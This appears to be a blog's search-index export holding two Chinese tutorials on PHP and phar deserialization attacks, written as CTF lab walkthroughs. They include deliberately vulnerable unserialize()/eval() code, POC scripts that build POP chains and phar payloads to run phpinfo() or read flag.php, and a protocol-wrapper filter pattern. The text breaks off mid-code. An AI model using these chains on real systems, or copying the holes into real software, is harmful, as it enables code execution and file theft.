<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP反序列化总结（一）</title>
    <url>/2020/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、魔术方法"><a href="#一、魔术方法" class="headerlink" title="一、魔术方法"></a>一、魔术方法</h2><h3 id="例举"><a href="#例举" class="headerlink" title="例举"></a>例举</h3><p>__wakeup() //使用unserialize时触发<br>__sleep()//使用serialize时触发<br>__destruct() //对象被销毁时触发<br>__call() //在对象上下文中调用不可访问的方法时触发<br>__callStatic()//在静态上下文中调用不可访问的方法时触发<br>__get() //用于从不可访问的属性读取数据<br>__set() //用于将数据写入不可访问的属性<br>__isset()//在不可访问的属性上调用isset()或empty()触发<br>__unset()//在不可访问的属性上使用unset()时触发<br>__toString()//把类当作字符串使用时触发<br>__invoke()//当脚本尝试将对象调用为函数时触发</p>
<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>new了一个对象，对象被执行，执行_construct<br>construct run<br>serialize了对一个对象，对象被序列化，先执行_sleep，再序列化<br>sleep run<br>unserialize了一个序列化字符串，对象被反序列化，先反序列化，再执行 _wakeup<br>把Test这个对象当做字符串使用了，执行_toString<br>toString run<br>程序执行完毕，对象自动销毁，执行_destruct<br>destruct rundestruct run</p>
<h2 id="二、魔术方法的具体应用"><a href="#二、魔术方法的具体应用" class="headerlink" title="二、魔术方法的具体应用"></a>二、魔术方法的具体应用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    private <span class="variable">$name</span> = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__construct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;\n__destruct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;__toString() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__sleep() call\n&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> array(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__wakeup() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __get(<span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__get() call\n&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __set(<span class="variable">$property</span>, <span class="variable">$value</span>)</span><br><span class="line">    &#123;   <span class="built_in">echo</span> <span class="string">&quot;\n__set() call\n&quot;</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="variable">$property</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;__invoke() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//调用 __construct()</span><br><span class="line"><span class="variable">$a</span> = new A();</span><br><span class="line"></span><br><span class="line">//调用 __toSting()</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">//调用 __sleep()</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">//调用 __wakeup()</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">//调用 __get()</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>-&gt;bbbb;</span><br><span class="line"></span><br><span class="line">//调用 __set()</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="string">&quot;pro&quot;</span>;//name属性是私有的无法直接访问</span><br><span class="line"></span><br><span class="line">//调用 __invoke()</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">//调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span><br></pre></td></tr></table></figure>
<p><img src="/images/web/php1.png" alt="direct"></p>
<p>补充：<br>可以看到最后调用两次__destruct()魔术方法，第一个是new一个对象后，在序列化后，该对象结束调用 __destruct()魔术方法 ，之后又进行了一次反序列化重新变为对象，直到最后程序结束，对象消失，再调用一次__destruct()魔术方法 。</p>
<p>遇到反序列化构造POP链的问题，可以配置Xdebug进行断点调试。</p>
<h2 id="三、例子"><a href="#三、例子" class="headerlink" title="三、例子"></a>三、例子</h2><h3 id><a href="#" class="headerlink" title></a></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析：这里只有一个A类，只有一个__wakeup()方法，并且一旦反序列化会走魔法方法__wakeup并且输出test，那我们就将A类序列化输出</p>
<p>POC:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = new A();</span><br><span class="line"><span class="variable">$c</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><p>如果__wakeup中不是echo $this-&gt;test;,是eval(*)那么就是任意代码执行危害巨大</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;<span class="built_in">test</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>原来的poc改一下，就可以<br>?test=O:1:”A”:1:{s:4:”test”;s:10:”phpinfo();”;}如下<br><img src="/images/web/2.png" alt="direct"></p>
<h3 id="当漏洞-危险代码存在在类的普通方法中"><a href="#当漏洞-危险代码存在在类的普通方法中" class="headerlink" title="当漏洞/危险代码存在在类的普通方法中"></a>当漏洞/危险代码存在在类的普通方法中</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class maniac&#123;</span><br><span class="line">        public <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span> =new x1();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span>-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">class x1&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">action</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;x1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class x2&#123;</span><br><span class="line">    public <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">action</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class2</span>  = new maniac();</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析：通过代码发现$_GET[‘test’]可控,因为使用unserialize()会自动调用__destruct()，所以他会先调用action()函数,然后会走到x1类和x2类，而安全问题在x2类中<br>POC：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class maniac&#123;</span><br><span class="line">        public <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span> = new x2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class x2&#123;</span><br><span class="line">        public <span class="variable">$test2</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$class1</span> = new maniac();</span><br><span class="line">    print_r(serialize(<span class="variable">$class1</span>))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如下<br><img src="/images/web/3.png" alt="direct"></p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is <span class="keyword">in</span> flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line">    public <span class="keyword">function</span> file_get(<span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;file_get(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">source</span>.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;<span class="built_in">source</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _show()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            die(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="variable">$this</span>-&gt;<span class="built_in">source</span>); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$p</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = new Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：<br>对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，<br>Read类有file_get_contents()函数，<br>Show类有highlight_file()函数可以读取文件。<br>接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发__wakeup魔术方法，而__wakeup魔术方法可以看到在Show类中。</p>
<p>1、__wakeup方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的__tostring方法，通篇看下代码发现__tostring魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发__tostring方法。</p>
<p>2、__tostring方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;<span class="built_in">source</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3、__get方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __get(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable">$this</span>-&gt;p;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>4、__invoke方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;file_get(<span class="variable">$this</span>-&gt;var);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可。</p>
<p>5、exp思路<br>pop链<br>unserialize函数（变量可控）–&gt;__wakeup()魔术方法–&gt;__tostring()魔术方法–&gt;__get魔术方法–&gt;__invoke魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php<br>hello接收参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">class Show&#123;</span><br><span class="line">    public <span class="variable">$source</span>;</span><br><span class="line">    public <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Test&#123;</span><br><span class="line">    public <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Read&#123;</span><br><span class="line">    public <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$s</span> = new Show();</span><br><span class="line"><span class="variable">$t</span> = new Test();</span><br><span class="line"><span class="variable">$r</span> = new Read();</span><br><span class="line"><span class="variable">$t</span>-&gt;p = <span class="variable">$r</span>;   //赋值Test类的对象(<span class="variable">$t</span>)下的属性p为Read类的对象(<span class="variable">$r</span>)，触发__invoke魔术方法</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&quot;str&quot;</span>] = <span class="variable">$t</span>;//赋值Show类的对象(<span class="variable">$s</span>)下的str数组的str键的值为 Test类的对象<span class="variable">$t</span> ，触发__get魔术方法。</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="built_in">source</span> = <span class="variable">$s</span>;//令 Show类的对象(<span class="variable">$s</span>)下的<span class="built_in">source</span>属性值为此时上一步已经赋值过的<span class="variable">$s</span>对象，从而把对象当作字符串调用触发__tostring魔术方法。</span><br><span class="line">var_dump(serialize(<span class="variable">$s</span>));</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>phar反序列化总结</title>
    <url>/2020/09/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、phar结构"><a href="#一、phar结构" class="headerlink" title="一、phar结构"></a>一、phar结构</h2><p>翻阅手册可以知道，phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)，以下是对详细的介绍：</p>
<h3 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h3><p>标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar。</p>
<h3 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h3><p>phar文件实质上是一种压缩文件，其中压缩信息、权限等都在这一部分里。当然，我们所需的攻击利用点meta-data序列化信息也在这一部分中。具体结构如图所示<br><img src="/images/web/phar1.png" alt="direct"></p>
<h3 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h3><p>被压缩的文件</p>
<h3 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h3><p>签名放在文件末尾</p>
<h2 id="二、测试"><a href="#二、测试" class="headerlink" title="二、测试"></a>二、测试</h2><h3 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h3><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类。<br>注意：需要将php.ini中的phar.readonly设置成off。</p>
<p>首先我们拥有一个 file_un.php 内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;cck&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析：这里有一个__destruct()的方法，对象在销毁时调用它，此时要注意__construct()的方法和__destruct()的方法的区别<br>__construct的方法在对象被创建时就会调用<br><img src="/images/web/phar2.jpg" alt="direct"><br>打印出来的内容为<br><img src="/images/web/phar3.jpg" alt="direct"><br>而当为__destruct()时<br><img src="/images/web/phar4.jpg" alt="direct"><br>打印出来的内容为<br><img src="/images/web/phar5.jpg" alt="direct"></p>
<p>于是构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;cck&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = new AnyClass();</span><br><span class="line"><span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当对其访问时，会生成一个 phar的文件<br><img src="/images/web/phar6.jpg" alt="direct"></p>
<h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p>而 phar://伪协议解析phar文件时对meta-data进行反序列化操作通过</p>
<p>于是通过file_un.php文件进行访问<br><img src="/images/web/phar7.jpg" alt="direct"><br>此时变成功</p>
<h3 id="CTF实例题目"><a href="#CTF实例题目" class="headerlink" title="CTF实例题目"></a>CTF实例题目</h3><p>如图所示<br><img src="/images/web/phar8.jpg" alt="direct"><br>查看源码，有类，有上传，有文件读取，很明显的phar反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$id</span>;</span><br><span class="line">    public <span class="variable">$age</span>=null;</span><br><span class="line">    public <span class="variable">$nickname</span>=null;</span><br><span class="line">    public <span class="variable">$backup</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">login</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mysqli</span>=new dbCtrl();</span><br><span class="line">        <span class="variable">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;login();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;id)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=1;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你的ID是&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你好！&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">upload</span></span>()&#123;</span><br><span class="line">        <span class="variable">$uploader</span>=new Upload();</span><br><span class="line">        <span class="variable">$uploader</span>-&gt;upload();</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">read</span></span>()&#123;</span><br><span class="line">        <span class="variable">$reader</span>=new reader();</span><br><span class="line">        <span class="variable">$reader</span>-&gt;<span class="built_in">read</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;nickname-&gt;backup=<span class="variable">$this</span>-&gt;backup;</span><br><span class="line">        <span class="variable">$user</span> = new User();</span><br><span class="line">        <span class="variable">$user</span>-&gt;id = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$user</span>-&gt;nickname = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="built_in">return</span> serialize(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    public <span class="variable">$dbuser</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$dbpass</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$database</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    public <span class="variable">$mysqli</span>;</span><br><span class="line">    public <span class="variable">$token</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span 